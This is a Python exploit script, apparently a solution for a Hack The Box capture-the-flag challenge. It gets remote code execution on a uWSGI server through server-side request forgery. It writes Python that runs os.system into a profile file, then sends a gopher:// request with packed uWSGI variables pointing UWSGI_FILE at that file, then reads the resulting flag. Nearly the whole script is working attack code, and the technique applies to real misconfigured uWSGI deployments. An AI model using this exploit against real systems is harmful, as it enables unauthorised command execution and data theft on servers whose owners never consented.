#!/usr/bin/python
# 
# RCE on a uwsgi server if the port is accessible via SSRF
# Write the path to an attacker controlled python file to the UWSGI_FILE variable
#
# 
############################

import sys
import socket
import argparse
import requests
from urllib.parse import quote

def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
    s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex')
    return s[::-1]


def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items() if hasattr(var, 'items') else var:
        pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
    result = b'\x00' + sz(pk) + b'\x00' + pk
    return result


def construct_payload(profile_id):

    var = {
        'REQUEST_METHOD': 'GET',
        'UWSGI_FILE': '/app/profiles/%s.json' % profile_id,
        'SCRIPT_NAME': '/',
    }
    wsgi_payload = pack_uwsgi_vars(var)
    encoded_string = quote(wsgi_payload)

    curl_payload = 'gopher:///127.0.0.1:5000/%s' % encoded_string
    
    return curl_payload
    
   

def update_profile(host, profile_id, profile_data):

    # Define the payload
    payload = {
        'profileData': profile_data
    }

    # Define the headers
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'  # Optional: specify response format
    }

    # Send the POST request with a timeout of 10 seconds
    url = "%s/profiles/%s/update" % (host, profile_id)
    resp = requests.post(url, json=payload, headers=headers, timeout=10)

    # Return the response object
    return resp


def trigger_profile_payload(host, profile_id):

    gopher_payload = construct_payload(profile_id)
    # Define the payload
    payload = {
        'profileURL': gopher_payload
    }

    # Define the headers
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'  # Optional: specify response format
    }

    # Send the POST request with a timeout of 10 seconds
    url = "%s/profiles/import" % (host)
    resp = requests.post(url, json=payload, headers=headers, timeout=10)

    # Return the response object
    return resp

def get_flag(host, profile_id):


    # Send the POST request with a timeout of 10 seconds
    url = "%s/profiles/%s" % (host, profile_id)
    resp = requests.get(url, timeout=10)

    # Return the response object
    return resp


def main(*args):
    desc = """
    HTB uwsgi challenge
    """
    elog = "Example：uwsgi_exp.py -u 1.2.3.4:5000 -c \"echo 111>/tmp/abc\""
    
    parser = argparse.ArgumentParser(description=desc, epilog=elog)

    parser.add_argument('-t', '--target', nargs='?', required=True,
                        help='HTB server: 127.0.0.1:1337',
                        dest='target')


    if len(sys.argv) < 2:
        parser.print_help()
        return
    args = parser.parse_args()
        
    payload_profile_id = "IOI-655321"
    flag_profile_id = "IOI-987654"

    read_flag_payload = '''import os
os.system("/readflag > /app/profiles/%s.json")
''' % flag_profile_id

    print("[*] Updating profile %s to contain payload." % payload_profile_id)
    resp = update_profile(args.target, payload_profile_id, read_flag_payload)
    if 'updated successfully' in resp.text:

        resp = trigger_profile_payload(args.target, payload_profile_id)
        if len(resp.text) > 0:
            print("[+] Trigger message:")
            print(resp.text)

        print("[*] Reading profile %s to see if it contains the flag." % flag_profile_id)
        resp = get_flag(args.target, flag_profile_id)
        output = resp.text
        if len(output) > 0 and 'HTB' in output:
            print("[+] Flag:")
            print(output)

    

if __name__ == '__main__':
    main()
